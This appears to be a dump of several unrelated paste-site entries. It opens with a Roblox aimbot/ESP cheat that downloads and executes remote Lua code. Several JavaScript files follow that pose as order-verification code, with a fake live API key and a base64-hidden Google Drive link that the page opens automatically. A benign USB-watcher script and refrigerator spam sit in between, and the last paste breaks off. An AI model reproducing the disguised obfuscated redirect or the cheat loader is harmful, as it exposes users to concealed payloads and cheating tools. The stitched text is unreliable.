loadstring(game:HttpGet(""https://raw.githubusercontent.com/Exunys/Roblox-Functions-Library/main/Library.lua""))()

local GUI = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Exunys/AirHub-V2/main/src/UI%20Library.lua""))()
local ESP = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Exunys/Exunys-ESP/main/src/ESP.lua""))()
local Aimbot = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Exunys/Aimbot-V3/main/src/Aimbot.lua""))()

--// Variables

local MainFrame = GUI:Load()

local ESP_DeveloperSettings = ESP.DeveloperSettings
local ESP_Settings = ESP.Settings
local ESP_Properties = ESP.Properties
local Crosshair = ESP_Properties.Crosshair
local CenterDot = Crosshair.CenterDot

local Aimbot_DeveloperSettings = Aimbot.DeveloperSettings
local Aimbot_Settings = Aimbot.Settings
local Aimbot_FOV = Aimbot.FOVSettings

ESP_Settings.LoadConfigOnLaunch = false
ESP_Settings.Enabled = false
Crosshair.Enabled = false
Aimbot_Settings.Enabled = false

local Fonts = {""UI"", ""System"", ""Plex"", ""Monospace""}
local TracerPositions = {""Bottom"", ""Center"", ""Mouse""}
local HealthBarPositions = {""Top"", ""Bottom"", ""Left"", ""Right""}

--// Tabs

local General, GeneralSignal = MainFrame:Tab(""General"")
local _Aimbot = MainFrame:Tab(""Aimbot"")
local _ESP = MainFrame:Tab(""ESP"")
local _Crosshair = MainFrame:Tab(""Crosshair"")
local Settings = MainFrame:Tab(""Settings"")

--// Functions

local AddValues = function(Section, Object, Exceptions, Prefix)
	local Keys, Copy = {}, {}

	for Index, _ in next, Object do
		Keys[#Keys + 1] = Index
	end

	tablesort(Keys, function(A, B)
		return A < B
	end)

	for _, Value in next, Keys do
		Copy[Value] = Object[Value]
	end

	for Index, Value in next, Copy do
		if typeof(Value) ~= ""boolean"" or (Exceptions and tablefind(Exceptions, Index)) then
			continue
		end

		Section:Toggle({
			Name = stringgsub(Index, ""(%l)(%u)"", function(...)
				return select(1, ...).."" ""..select(2, ...)
			end),
			Flag = Prefix..Index,
			Default = Value,
			Callback = function(_Value)
				Object[Index] = _Value
			end
		})
	end

	for Index, Value in next, Copy do
		if typeof(Value) ~= ""Color3"" or (Exceptions and tablefind(Exceptions, Index)) then
			continue
		end

		Section:Colorpicker({
			Name = stringgsub(Index, ""(%l)(%u)"", function(...)
				return select(1, ...).."" ""..select(2, ...)
			end),
			Flag = Index,
			Default = Value,
			Callback = function(_Value)
				Object[Index] = _Value
			end
		})
	end
end

--// General Tab

local AimbotSection = General:Section({
	Name = ""Aimbot Settings"",
	Side = ""Left""
})

local ESPSection = General:Section({
	Name = ""ESP Settings"",
	Side = ""Right""
})

local ESPDeveloperSection = General:Section({
	Name = ""ESP Developer Settings"",
	Side = ""Right""
})

AddValues(ESPDeveloperSection, ESP_DeveloperSettings, {}, ""ESP_DeveloperSettings_"")

ESPDeveloperSection:Dropdown({
	Name = ""Update Mode"",
	Flag = ""ESP_UpdateMode"",
	Content = {""RenderStepped"", ""Stepped"", ""Heartbeat""},
	Default = ESP_DeveloperSettings.UpdateMode,
	Callback = function(Value)
		ESP_DeveloperSettings.UpdateMode = Value
	end
})

ESPDeveloperSection:Dropdown({
	Name = ""Team Check Option"",
	Flag = ""ESP_TeamCheckOption"",
	Content = {""TeamColor"", ""Team""},
	Default = ESP_DeveloperSettings.TeamCheckOption,
	Callback = function(Value)
		ESP_DeveloperSettings.TeamCheckOption = Value
	end
})

ESPDeveloperSection:Slider({
	Name = ""Rainbow Speed"",
	Flag = ""ESP_RainbowSpeed"",
	Default = ESP_DeveloperSettings.RainbowSpeed * 10,
	Min = 5,
	Max = 30,
	Callback = function(Value)
		ESP_DeveloperSettings.RainbowSpeed = Value / 10
	end
})

ESPDeveloperSection:Slider({
	Name = ""Width Boundary"",
	Flag = ""ESP_WidthBoundary"",
	Default = ESP_DeveloperSettings.WidthBoundary * 10,
	Min = 5,
	Max = 30,
	Callback = function(Value)
		ESP_DeveloperSettings.WidthBoundary = Value / 10
	end
})

ESPDeveloperSection:Button({
	Name = ""Refresh"",
	Callback = function()
		ESP:Restart()
	end
})

AddValues(ESPSection, ESP_Settings, {""LoadConfigOnLaunch"", ""PartsOnly""}, ""ESPSettings_"")

AimbotSection:Toggle({
	Name = ""Enabled"",
	Flag = ""Aimbot_Enabled"",
	Default = Aimbot_Settings.Enabled,
	Callback = function(Value)
		Aimbot_Settings.Enabled = Value
	end
})

AddValues(AimbotSection, Aimbot_Settings, {""Enabled"", ""Toggle"", ""OffsetToMoveDirection""}, ""Aimbot_"")

local AimbotDeveloperSection = General:Section({
	Name = ""Aimbot Developer Settings"",
	Side = ""Left""
})

AimbotDeveloperSection:Dropdown({
	Name = ""Update Mode"",
	Flag = ""Aimbot_UpdateMode"",
	Content = {""RenderStepped"", ""Stepped"", ""Heartbeat""},
	Default = Aimbot_DeveloperSettings.UpdateMode,
	Callback = function(Value)
		Aimbot_DeveloperSettings.UpdateMode = Value
	end
})

AimbotDeveloperSection:Dropdown({
	Name = ""Team Check Option"",
	Flag = ""Aimbot_TeamCheckOption"",
	Content = {""TeamColor"", ""Team""},
	Default = Aimbot_DeveloperSettings.TeamCheckOption,
	Callback = function(Value)
		Aimbot_DeveloperSettings.TeamCheckOption = Value
	end
})

AimbotDeveloperSection:Slider({
	Name = ""Rainbow Speed"",
	Flag = ""Aimbot_RainbowSpeed"",
	Default = Aimbot_DeveloperSettings.RainbowSpeed * 10,
	Min = 5,
	Max = 30,
	Callback = function(Value)
		Aimbot_DeveloperSettings.RainbowSpeed = Value / 10
	end
})

AimbotDeveloperSection:Button({
	Name = ""Refresh"",
	Callback = function()
		Aimbot.Restart()
	end
})

--// Aimbot Tab

local AimbotPropertiesSection = _Aimbot:Section({
	Name = ""Properties"",
	Side = ""Left""
})

AimbotPropertiesSection:Toggle({
	Name = ""Toggle"",
	Flag = ""Aimbot_Toggle"",
	Default = Aimbot_Settings.Toggle,
	Callback = function(Value)
		Aimbot_Settings.Toggle = Value
	end
})

AimbotPropertiesSection:Toggle({
	Name = ""Offset To Move Direction"",
	Flag = ""Aimbot_OffsetToMoveDirection"",
	Default = Aimbot_Settings.OffsetToMoveDirection,
	Callback = function(Value)
		Aimbot_Settings.OffsetToMoveDirection = Value
	end
})

AimbotPropertiesSection:Slider({
	Name = ""Offset Increment"",
	Flag = ""Aimbot_OffsetIncrementy"",
	Default = Aimbot_Settings.OffsetIncrement,
	Min = 1,
	Max = 30,
	Callback = function(Value)
		Aimbot_Settings.OffsetIncrement = Value
	end
})

AimbotPropertiesSection:Slider({
	Name = ""Animation Sensitivity (ms)"",
	Flag = ""Aimbot_Sensitivity"",
	Default = Aimbot_Settings.Sensitivity * 100,
	Min = 0,
	Max = 100,
	Callback = function(Value)
		Aimbot_Settings.Sensitivity = Value / 100
	end
})

AimbotPropertiesSection:Slider({
	Name = ""mousemoverel Sensitivity"",
	Flag = ""Aimbot_Sensitivity2"",
	Default = Aimbot_Settings.Sensitivity2 * 100,
	Min = 0,
	Max = 500,
	Callback = function(Value)
		Aimbot_Settings.Sensitivity2 = Value / 100
	end
})

AimbotPropertiesSection:Dropdown({
	Name = ""Lock Mode"",
	Flag = ""Aimbot_Settings_LockMode"",
	Content = {""CFrame"", ""mousemoverel""},
	Default = Aimbot_Settings.LockMode == 1 and ""CFrame"" or ""mousemoverel"",
	Callback = function(Value)
		Aimbot_Settings.LockMode = Value == ""CFrame"" and 1 or 2
	end
})

AimbotPropertiesSection:Dropdown({
	Name = ""Lock Part"",
	Flag = ""Aimbot_LockPart"",
	Content = {""Head"", ""HumanoidRootPart"", ""Torso"", ""Left Arm"", ""Right Arm"", ""Left Leg"", ""Right Leg"", ""LeftHand"", ""RightHand"", ""LeftLowerArm"", ""RightLowerArm"", ""LeftUpperArm"", ""RightUpperArm"", ""LeftFoot"", ""LeftLowerLeg"", ""UpperTorso"", ""LeftUpperLeg"", ""RightFoot"", ""RightLowerLeg"", ""LowerTorso"", ""RightUpperLeg""},
	Default = Aimbot_Settings.LockPart,
	Callback = function(Value)
		Aimbot_Settings.LockPart = Value
	end
})

AimbotPropertiesSection:Keybind({
	Name = ""Trigger Key"",
	Flag = ""Aimbot_TriggerKey"",
	Default = Aimbot_Settings.TriggerKey,
	Callback = function(Keybind)
		Aimbot_Settings.TriggerKey = Keybind
	end
})

local UserBox = AimbotPropertiesSection:Box({
	Name = ""Player Name (shortened allowed)"",
	Flag = ""Aimbot_PlayerName"",
	Placeholder = ""Username""
})

AimbotPropertiesSection:Button({
	Name = ""Blacklist (Ignore) Player"",
	Callback = function()
		pcall(Aimbot.Blacklist, Aimbot, GUI.flags[""Aimbot_PlayerName""])
		UserBox:Set("""")
	end
})

AimbotPropertiesSection:Button({
	Name = ""Whitelist Player"",
	Callback = function()
		pcall(Aimbot.Whitelist, Aimbot, GUI.flags[""Aimbot_PlayerName""])
		UserBox:Set("""")
	end
})

local AimbotFOVSection = _Aimbot:Section({
	Name = ""Field Of View Settings"",
	Side = ""Right""
})

AddValues(AimbotFOVSection, Aimbot_FOV, {}, ""Aimbot_FOV_"")

AimbotFOVSection:Slider({
	Name = ""Field Of View"",
	Flag = ""Aimbot_FOV_Radius"",
	Default = Aimbot_FOV.Radius,
	Min = 0,
	Max = 720,
	Callback = function(Value)
		Aimbot_FOV.Radius = Value
	end
})

AimbotFOVSection:Slider({
	Name = ""Sides"",
	Flag = ""Aimbot_FOV_NumSides"",
	Default = Aimbot_FOV.NumSides,
	Min = 3,
	Max = 60,
	Callback = function(Value)
		Aimbot_FOV.NumSides = Value
	end
})

AimbotFOVSection:Slider({
	Name = ""Transparency"",
	Flag = ""Aimbot_FOV_Transparency"",
	Default = Aimbot_FOV.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		Aimbot_FOV.Transparency = Value / 10
	end
})

AimbotFOVSection:Slider({
	Name = ""Thickness"",
	Flag = ""Aimbot_FOV_Thickness"",
	Default = Aimbot_FOV.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		Aimbot_FOV.Thickness = Value
	end
})

--// ESP Tab

local ESP_Properties_Section = _ESP:Section({
	Name = ""ESP Properties"",
	Side = ""Left""
})

AddValues(ESP_Properties_Section, ESP_Properties.ESP, {}, ""ESP_Propreties_"")

ESP_Properties_Section:Dropdown({
	Name = ""Text Font"",
	Flag = ""ESP_TextFont"",
	Content = Fonts,
	Default = Fonts[ESP_Properties.ESP.Font + 1],
	Callback = function(Value)
		ESP_Properties.ESP.Font = Drawing.Fonts[Value]
	end
})

ESP_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""ESP_TextTransparency"",
	Default = ESP_Properties.ESP.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.ESP.Transparency = Value / 10
	end
})

ESP_Properties_Section:Slider({
	Name = ""Font Size"",
	Flag = ""ESP_FontSize"",
	Default = ESP_Properties.ESP.Size,
	Min = 1,
	Max = 20,
	Callback = function(Value)
		ESP_Properties.ESP.Size = Value
	end
})

ESP_Properties_Section:Slider({
	Name = ""Offset"",
	Flag = ""ESP_Offset"",
	Default = ESP_Properties.ESP.Offset,
	Min = 10,
	Max = 30,
	Callback = function(Value)
		ESP_Properties.ESP.Offset = Value
	end
})

local Tracer_Properties_Section = _ESP:Section({
	Name = ""Tracer Properties"",
	Side = ""Right""
})

AddValues(Tracer_Properties_Section, ESP_Properties.Tracer, {}, ""Tracer_Properties_"")

Tracer_Properties_Section:Dropdown({
	Name = ""Position"",
	Flag = ""Tracer_Position"",
	Content = TracerPositions,
	Default = TracerPositions[ESP_Properties.Tracer.Position],
	Callback = function(Value)
		ESP_Properties.Tracer.Position = tablefind(TracerPositions, Value)
	end
})

Tracer_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""Tracer_Transparency"",
	Default = ESP_Properties.Tracer.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.Tracer.Transparency = Value / 10
	end
})

Tracer_Properties_Section:Slider({
	Name = ""Thickness"",
	Flag = ""Tracer_Thickness"",
	Default = ESP_Properties.Tracer.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		ESP_Properties.Tracer.Thickness = Value
	end
})

local HeadDot_Properties_Section = _ESP:Section({
	Name = ""Head Dot Properties"",
	Side = ""Left""
})

AddValues(HeadDot_Properties_Section, ESP_Properties.HeadDot, {}, ""HeadDot_Properties_"")

HeadDot_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""HeadDot_Transparency"",
	Default = ESP_Properties.HeadDot.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.HeadDot.Transparency = Value / 10
	end
})

HeadDot_Properties_Section:Slider({
	Name = ""Thickness"",
	Flag = ""HeadDot_Thickness"",
	Default = ESP_Properties.HeadDot.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		ESP_Properties.HeadDot.Thickness = Value
	end
})

HeadDot_Properties_Section:Slider({
	Name = ""Sides"",
	Flag = ""HeadDot_Sides"",
	Default = ESP_Properties.HeadDot.NumSides,
	Min = 3,
	Max = 30,
	Callback = function(Value)
		ESP_Properties.HeadDot.NumSides = Value
	end
})

local Box_Properties_Section = _ESP:Section({
	Name = ""Box Properties"",
	Side = ""Left""
})

AddValues(Box_Properties_Section, ESP_Properties.Box, {}, ""Box_Properties_"")

Box_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""Box_Transparency"",
	Default = ESP_Properties.Box.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.Box.Transparency = Value / 10
	end
})

Box_Properties_Section:Slider({
	Name = ""Thickness"",
	Flag = ""Box_Thickness"",
	Default = ESP_Properties.Box.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		ESP_Properties.Box.Thickness = Value
	end
})

local HealthBar_Properties_Section = _ESP:Section({
	Name = ""Health Bar Properties"",
	Side = ""Right""
})

AddValues(HealthBar_Properties_Section, ESP_Properties.HealthBar, {}, ""HealthBar_Properties_"")

HealthBar_Properties_Section:Dropdown({
	Name = ""Position"",
	Flag = ""HealthBar_Position"",
	Content = HealthBarPositions,
	Default = HealthBarPositions[ESP_Properties.HealthBar.Position],
	Callback = function(Value)
		ESP_Properties.HealthBar.Position = tablefind(HealthBarPositions, Value)
	end
})

HealthBar_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""HealthBar_Transparency"",
	Default = ESP_Properties.HealthBar.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.HealthBar.Transparency = Value / 10
	end
})

HealthBar_Properties_Section:Slider({
	Name = ""Thickness"",
	Flag = ""HealthBar_Thickness"",
	Default = ESP_Properties.HealthBar.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		ESP_Properties.HealthBar.Thickness = Value
	end
})

HealthBar_Properties_Section:Slider({
	Name = ""Offset"",
	Flag = ""HealthBar_Offset"",
	Default = ESP_Properties.HealthBar.Offset,
	Min = 4,
	Max = 12,
	Callback = function(Value)
		ESP_Properties.HealthBar.Offset = Value
	end
})

HealthBar_Properties_Section:Slider({
	Name = ""Blue"",
	Flag = ""HealthBar_Blue"",
	Default = ESP_Properties.HealthBar.Blue,
	Min = 0,
	Max = 255,
	Callback = function(Value)
		ESP_Properties.HealthBar.Blue = Value
	end
})

local Chams_Properties_Section = _ESP:Section({
	Name = ""Chams Properties"",
	Side = ""Right""
})

AddValues(Chams_Properties_Section, ESP_Properties.Chams, {}, ""Chams_Properties_"")

Chams_Properties_Section:Slider({
	Name = ""Transparency"",
	Flag = ""Chams_Transparency"",
	Default = ESP_Properties.Chams.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		ESP_Properties.Chams.Transparency = Value / 10
	end
})

Chams_Properties_Section:Slider({
	Name = ""Thickness"",
	Flag = ""Chams_Thickness"",
	Default = ESP_Properties.Chams.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		ESP_Properties.Chams.Thickness = Value
	end
})

--// Crosshair Tab

local Crosshair_Settings = _Crosshair:Section({
	Name = ""Crosshair Settings (1 / 2)"",
	Side = ""Left""
})

Crosshair_Settings:Toggle({
	Name = ""Enabled"",
	Flag = ""Crosshair_Enabled"",
	Default = Crosshair.Enabled,
	Callback = function(Value)
		Crosshair.Enabled = Value
	end
})

Crosshair_Settings:Toggle({
	Name = ""Enable ROBLOX Cursor"",
	Flag = ""Cursor_Enabled"",
	Default = UserInputService.MouseIconEnabled,
	Callback = SetMouseIconVisibility
})

AddValues(Crosshair_Settings, Crosshair, {""Enabled""}, ""Crosshair_"")

Crosshair_Settings:Dropdown({
	Name = ""Position"",
	Flag = ""Crosshair_Position"",
	Content = {""Mouse"", ""Center""},
	Default = ({""Mouse"", ""Center""})[Crosshair.Position],
	Callback = function(Value)
		Crosshair.Position = Value == ""Mouse"" and 1 or 2
	end
})

Crosshair_Settings:Slider({
	Name = ""Size"",
	Flag = ""Crosshair_Size"",
	Default = Crosshair.Size,
	Min = 1,
	Max = 24,
	Callback = function(Value)
		Crosshair.Size = Value
	end
})

Crosshair_Settings:Slider({
	Name = ""Gap Size"",
	Flag = ""Crosshair_GapSize"",
	Default = Crosshair.GapSize,
	Min = 0,
	Max = 24,
	Callback = function(Value)
		Crosshair.GapSize = Value
	end
})

Crosshair_Settings:Slider({
	Name = ""Rotation (Degrees)"",
	Flag = ""Crosshair_Rotation"",
	Default = Crosshair.Rotation,
	Min = -180,
	Max = 180,
	Callback = function(Value)
		Crosshair.Rotation = Value
	end
})

Crosshair_Settings:Slider({
	Name = ""Rotation Speed"",
	Flag = ""Crosshair_RotationSpeed"",
	Default = Crosshair.RotationSpeed,
	Min = 1,
	Max = 20,
	Callback = function(Value)
		Crosshair.RotationSpeed = Value
	end
})

Crosshair_Settings:Slider({
	Name = ""Pulsing Step"",
	Flag = ""Crosshair_PulsingStep"",
	Default = Crosshair.PulsingStep,
	Min = 0,
	Max = 24,
	Callback = function(Value)
		Crosshair.PulsingStep = Value
	end
})

local _Crosshair_Settings = _Crosshair:Section({
	Name = ""Crosshair Settings (2 / 2)"",
	Side = ""Left""
})

_Crosshair_Settings:Slider({
	Name = ""Pulsing Speed"",
	Flag = ""Crosshair_PulsingSpeed"",
	Default = Crosshair.PulsingSpeed,
	Min = 1,
	Max = 20,
	Callback = function(Value)
		Crosshair.PulsingSpeed = Value
	end
})

_Crosshair_Settings:Slider({
	Name = ""Pulsing Boundary (Min)"",
	Flag = ""Crosshair_Pulse_Min"",
	Default = Crosshair.PulsingBounds[1],
	Min = 0,
	Max = 24,
	Callback = function(Value)
		Crosshair.PulsingBounds[1] = Value
	end
})

_Crosshair_Settings:Slider({
	Name = ""Pulsing Boundary (Max)"",
	Flag = ""Crosshair_Pulse_Max"",
	Default = Crosshair.PulsingBounds[2],
	Min = 0,
	Max = 24,
	Callback = function(Value)
		Crosshair.PulsingBounds[2] = Value
	end
})

_Crosshair_Settings:Slider({
	Name = ""Transparency"",
	Flag = ""Crosshair_Transparency"",
	Default = Crosshair.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		Crosshair.Transparency = Value / 10
	end
})

_Crosshair_Settings:Slider({
	Name = ""Thickness"",
	Flag = ""Crosshair_Thickness"",
	Default = Crosshair.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		Crosshair.Thickness = Value
	end
})

local Crosshair_CenterDot = _Crosshair:Section({
	Name = ""Center Dot Settings"",
	Side = ""Right""
})

Crosshair_CenterDot:Toggle({
	Name = ""Enabled"",
	Flag = ""Crosshair_CenterDot_Enabled"",
	Default = CenterDot.Enabled,
	Callback = function(Value)
		CenterDot.Enabled = Value
	end
})

AddValues(Crosshair_CenterDot, CenterDot, {""Enabled""}, ""Crosshair_CenterDot_"")

Crosshair_CenterDot:Slider({
	Name = ""Size / Radius"",
	Flag = ""Crosshair_CenterDot_Radius"",
	Default = CenterDot.Radius,
	Min = 2,
	Max = 8,
	Callback = function(Value)
		CenterDot.Radius = Value
	end
})

Crosshair_CenterDot:Slider({
	Name = ""Sides"",
	Flag = ""Crosshair_CenterDot_Sides"",
	Default = CenterDot.NumSides,
	Min = 3,
	Max = 30,
	Callback = function(Value)
		CenterDot.NumSides = Value
	end
})

Crosshair_CenterDot:Slider({
	Name = ""Transparency"",
	Flag = ""Crosshair_CenterDot_Transparency"",
	Default = CenterDot.Transparency * 10,
	Min = 1,
	Max = 10,
	Callback = function(Value)
		CenterDot.Transparency = Value / 10
	end
})

Crosshair_CenterDot:Slider({
	Name = ""Thickness"",
	Flag = ""Crosshair_CenterDot_Thickness"",
	Default = CenterDot.Thickness,
	Min = 1,
	Max = 5,
	Callback = function(Value)
		CenterDot.Thickness = Value
	end
})

--// Settings Tab

local SettingsSection = Settings:Section({
	Name = ""Settings"",
	Side = ""Left""
})

local ProfilesSection = Settings:Section({
	Name = ""Profiles"",
	Side = ""Left""
})

local InformationSection = Settings:Section({
	Name = ""Information"",
	Side = ""Right""
})

SettingsSection:Keybind({
	Name = ""Show / Hide GUI"",
	Flag = ""UI Toggle"",
	Default = Enum.KeyCode.RightShift,
	Blacklist = {Enum.UserInputType.MouseButton1, Enum.UserInputType.MouseButton2, Enum.UserInputType.MouseButton3},
	Callback = function(_, NewKeybind)
		if not NewKeybind then
			GUI:Close()
		end
	end
})

SettingsSection:Button({
	Name = ""Unload Script"",
	Callback = function()
		GUI:Unload()
		ESP:Exit()
		Aimbot:Exit()
		getgenv().AirHubV2Loaded = nil
	end
})

local ConfigList = ProfilesSection:Dropdown({
	Name = ""Configurations"",
	Flag = ""Config Dropdown"",
	Content = GUI:GetConfigs()
})

ProfilesSection:Box({
	Name = ""Configuration Name"",
	Flag = ""Config Name"",
	Placeholder = ""Config Name""
})

ProfilesSection:Button({
	Name = ""Load Configuration"",
	Callback = function()
		GUI:LoadConfig(GUI.flags[""Config Dropdown""])
	end
})

ProfilesSection:Button({
	Name = ""Delete Configuration"",
	Callback = function()
		GUI:DeleteConfig(GUI.flags[""Config Dropdown""])
		ConfigList:Refresh(GUI:GetConfigs())
	end
})

ProfilesSection:Button({
	Name = ""Save Configuration"",
	Callback = function()
		GUI:SaveConfig(GUI.flags[""Config Dropdown""] or GUI.flags[""Config Name""])
		ConfigList:Refresh(GUI:GetConfigs())
	end
})

InformationSection:Label(""Made by Exunys"")

InformationSection:Button({
	Name = ""Copy GitHub"",
	Callback = function()
		setclipboard(""https://github.com/Exunys"")
	end
})

InformationSection:Label(""AirTeam © 2022 - ""..osdate(""%Y""))

InformationSection:Button({
	Name = ""Copy Discord Invite"",
	Callback = function()
		setclipboard(""https://discord.gg/Ncz3H3quUZ"")
	end
})

--[=[
local MiscellaneousSection = Settings:Section({
	Name = ""Miscellaneous"",
	Side = ""Right""
})

local TimeLabel = MiscellaneousSection:Label(""..."")
local FPSLabel = MiscellaneousSection:Label(""..."")
local PlayersLabel = MiscellaneousSection:Label(""..."")

MiscellaneousSection:Button({
	Name = ""Rejoin"",
	Callback = Rejoin
})

delay(2, function()
	spawn(function()
		while wait(1) do
			TimeLabel:Set(osdate(""%c""))
			PlayersLabel:Set(#Players:GetPlayers())
		end
	end)

	RunService.RenderStepped:Connect(function(FPS)
		FPSLabel:Set(""FPS: ""..mathfloor(1 / FPS))
	end)
end)
]=]

--//

ESP.Load()
Aimbot.Load()
getgenv().AirHubV2Loaded = true
getgenv().AirHubV2Loading = nil

GeneralSignal:Fire()
GUI:Close()"
hK0F2bjz,Untitled,zebmekey,JavaScript,Sunday 6th of April 2025 08:38:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72661/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
W3nHSi85,Products.js,zebmekey,JavaScript,Sunday 6th of April 2025 08:23:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94439/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
k1ZxB08q,usb-log-watcher.sh,muttmutt,Bash,Sunday 6th of April 2025 08:09:09 PM CDT,"#!/bin/bash

PLUGGED=""enumerated 0x05ac/110c/b817 (AirPods Max USB Audio / 1)""
UNPLUGGED=""(AirPods Max USB Audio): hardware connection lost""
IDENTIFIER=""AirPods Max""

PREVIOUS_STATE=""disconnected""

log stream --predicate 'eventMessage contains ""USB""' --info | while read -r line; do
  if echo ""$line"" | grep -q ""$IDENTIFIER""; then
    if echo ""$line"" | grep -iq ""$PLUGGED""; then
      if [ ""$PREVIOUS_STATE"" != ""connected"" ]; then
        #echo ""[$(date)] AirPods Max connected – quitting SoundSource""
        osascript -e 'tell application ""SoundSource"" to quit'
        osascript -e 'display notification ""AirPods Max connected – SoundSource quit"" with title ""USB Audio Event""'
        PREVIOUS_STATE=""connected""
      fi
    elif echo ""$line"" | grep -iq ""$UNPLUGGED""; then
      if [ ""$PREVIOUS_STATE"" != ""disconnected"" ]; then
        #echo ""[$(date)] AirPods Max disconnected – launching SoundSource""
        osascript -e 'tell application ""SoundSource"" to activate'
        osascript -e 'display notification ""AirPods Max disconnected – SoundSource started"" with title ""USB Audio Event""'
        PREVIOUS_STATE=""disconnected""
      fi
    fi
  fi
done
"
irfQKWgX,Order.js,zebmekey,JavaScript,Sunday 6th of April 2025 08:07:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51934/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
x4HFSuA2,Panasonic Inverter Refrigerator,westernappstalucia,HTML,Sunday 6th of April 2025 07:58:14 PM CDT,"Panasonic inverter refrigerators combine advanced technology with energy efficiency, making them an excellent choice for modern homes. Their inverter technology allows the compressor to adjust its speed based on cooling demand, ensuring consistent temperature control while consuming less energy. This results in lower electricity bills and a more sustainable appliance that operates quietly and efficiently. Panasonic's refrigerators are also designed with premium features, such as spacious compartments, adjustable shelves, and powerful cooling systems, keeping your food fresh for longer.

Beyond efficiency, Panasonic refrigerators are built for convenience and durability. They feature advanced storage solutions, antibacterial coatings, and intelligent humidity control, ensuring that fruits, vegetables, and other perishables stay fresh for extended periods. With a sleek and modern design, these refrigerators complement any kitchen setup, providing both style and functionality. Additionally, Panasonic offers various sizes and models, catering to different household needs.

Investing in a Panasonic inverter refrigerator means prioritizing both energy savings and long-term reliability. Explore the range of models available and experience the benefits of cutting-edge cooling technology.

Upgrade to a Panasonic inverter refrigerator today and enjoy energy-efficient cooling. Explore your options here! For more information, read more on <a href=""https://western.com.ph/blog/panasonic-inverter-refrigerator-philippines/"">Panasonic Inverter Refrigerator</a>."
a2nNr40a,Market.js,zebmekey,JavaScript,Sunday 6th of April 2025 07:52:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78156/status"";
